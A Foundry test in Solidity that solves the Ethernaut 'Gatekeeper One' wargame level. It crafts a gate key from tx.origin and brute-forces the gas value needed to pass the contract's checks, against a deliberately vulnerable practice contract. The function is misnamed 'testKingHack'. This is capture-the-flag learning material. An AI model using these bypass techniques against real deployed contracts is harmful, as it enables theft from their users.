// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "lib/forge-std/lib/ds-test/src/test.sol";
import "../src/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/13-GatekeeperOne/GatekeeperOneHack.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create GatekeeperOneHack contract
        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack(levelAddress);

        // Need at 8 byte key that matches the conditions for gate 3 - we start from the fixed value - uint16(uint160(tx.origin) - then work out what the key needs to be
        bytes4 halfKey = bytes4(bytes.concat(bytes2(uint16(0)), bytes2(uint16(uint160(tx.origin)))));
        // key = "0x0000ea720000ea72"
        bytes8 key = bytes8(bytes.concat(halfKey, halfKey));

        // View emitted values and compare them to the requires in Gatekeeper One
        emit log_named_uint("Gate 3 all requires", uint32(uint64(key)));
        emit log_named_uint("Gate 3 first require", uint16(uint64(key)));
        emit log_named_uint("Gate 3 second require", uint64(key));
        emit log_named_uint("Gate 3 third require", uint16(uint160(tx.origin)));

        // Loop through a until correct gas is found, use try catch to get arounf the revert
        for (uint256 i = 0; i <= 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: 73990 + i}(key) {
                emit log_named_uint("Pass - Gas", 73990 + i);
                break;
            } catch {
                emit log_named_uint("Fail - Gas", 73990 + i);
            }
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
